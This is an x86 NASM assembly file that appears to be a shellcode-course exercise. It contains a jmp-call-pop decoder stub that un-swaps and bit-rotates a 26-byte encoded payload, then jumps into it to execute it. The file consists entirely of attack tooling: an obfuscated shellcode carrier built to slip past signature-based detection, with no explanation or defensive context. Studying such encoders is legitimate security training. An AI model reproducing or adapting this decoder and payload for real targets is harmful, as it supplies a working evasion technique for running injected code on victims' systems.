; Filename: kaiten-suwappa.nasm
; Author:  Lucas Kauffman
; Website:  http://cloud101.eu
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 13


decode:

	mov al, byte  [esi]
	mov bl, byte [esi+1]
	ror al,2
	rol bl,4	
	mov byte [esi], bl
	mov byte [esi+1],al
	add esi,2
	loop decode
	jmp short EncodedShellcode

call_shellcode:

	call decoder	
	EncodedShellcode: db 0xc4,0x9,0x41,0xc,0xbc,0x86,0xcd,0xf2,0xa1,0x86,0x89,0xf2,0xb9,0x96,0x8f,0x98,0x26,0x5,0x4d,0x2e,0x87,0x98,0x2c,0xb,0x2,0xdc
